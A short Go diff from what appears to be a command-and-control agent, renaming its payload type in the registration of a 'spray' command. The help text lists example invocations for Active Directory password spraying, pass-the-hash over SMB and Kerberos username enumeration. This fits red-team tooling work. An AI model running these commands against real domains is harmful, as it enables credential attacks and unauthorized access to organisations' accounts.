@@ -9,7 +9,7 @@ import (
 )
 
 func init() {
-	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
 		Name:                "spray",
 		Description:         "Password spray or Kerberos user enumeration against AD. Spray via Kerberos pre-auth, LDAP bind, or SMB auth. SMB supports pass-the-hash. Enumerate validates usernames without credentials.",
 		HelpString:          "spray -action kerberos -server 192.168.1.1 -domain CORP.LOCAL -users \"user1\\nuser2\\nuser3\" -password Summer2026!\nspray -action smb -server dc01 -domain corp.local -users \"admin\\njsmith\" -hash aad3b435b51404ee:8846f7eaee8fb117\nspray -action enumerate -server dc01 -domain corp.local -users \"admin\\njsmith\\nsvc_backup\"\nspray -action ldap -server dc01 -domain corp.local -users \"admin\\njsmith\" -password Password1 -delay 1000 -jitter 25",
